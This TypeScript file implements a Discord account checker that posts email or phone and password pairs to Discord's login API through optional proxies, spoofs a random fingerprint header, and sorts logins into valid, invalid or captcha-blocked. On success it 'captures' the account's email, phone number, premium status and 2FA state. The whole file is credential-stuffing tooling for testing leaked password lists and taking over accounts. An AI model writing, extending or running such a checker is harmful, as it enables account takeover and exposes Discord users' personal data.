import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class DiscordChecker extends BaseChecker {
  constructor(proxy?: any, timeout?: number) {
    super('discord', proxy, timeout);
  }

  async check(credential: string, password: string): Promise<CheckResult> {
    return this.checkWithFallback(
      credential,
      password,
      this.checkWithCredential.bind(this),
      // Discord primarily uses email, but can also accept phone numbers
      this.isEmail(credential) ? this.checkAsPhone.bind(this) : this.checkAsEmail.bind(this)
    );
  }

  private async checkWithCredential(credential: string, password: string): Promise<CheckResult> {
    try {
      // Discord login endpoint
      const loginResponse = await this.client.post(
        'https://discord.com/api/v9/auth/login',
        {
          login: credential,
          password: password,
          undelete: false,
        },
        {
          headers: {
            'Content-Type': 'application/json',
            'X-Fingerprint': this.generateFingerprint(),
          },
        }
      );

      if (loginResponse.data?.token) {
        const capture = await this.getAccountDetails(loginResponse.data.token);
        return this.createResult(credential, password, 'discord', 'valid', capture);
      }

      if (loginResponse.data?.mfa) {
        return this.createResult(credential, password, 'discord', 'valid', {
          twoFactorEnabled: true,
        });
      }

      if (loginResponse.data?.captcha_key) {
        return this.createResult(credential, password, 'discord', 'error', undefined, 'Captcha required');
      }

      return this.createResult(credential, password, 'discord', 'invalid');
    } catch (error: any) {
      return this.handleError(error, credential, password);
    }
  }

  private async checkAsPhone(credential: string, password: string): Promise<CheckResult> {
    // If we tried email, try as phone (less common but possible)
    return this.createResult(credential, password, 'discord', 'invalid');
  }

  private async checkAsEmail(credential: string, password: string): Promise<CheckResult> {
    // If we tried username/phone, try as email
    return this.checkWithCredential(credential, password);
  }

  private generateFingerprint(): string {
    // Generate a basic fingerprint for Discord API
    const chars = '0123456789abcdef';
    let result = '';
    for (let i = 0; i < 32; i++) {
      result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
  }

  private async getAccountDetails(token: string) {
    try {
      const response = await this.client.get(
        'https://discord.com/api/v9/users/@me',
        {
          headers: {
            Authorization: token,
          },
        }
      );

      return {
        username: response.data?.username,
        displayName: response.data?.global_name,
        email: response.data?.email,
        emailVerified: response.data?.verified,
        phoneNumber: response.data?.phone,
        createdDate: response.data?.id 
          ? new Date((parseInt(response.data.id) / 4194304) + 1420070400000).toISOString()
          : undefined,
        isPremium: response.data?.premium_type > 0,
        twoFactorEnabled: response.data?.mfa_enabled,
        locale: response.data?.locale,
      };
    } catch {
      return {};
    }
  }
}
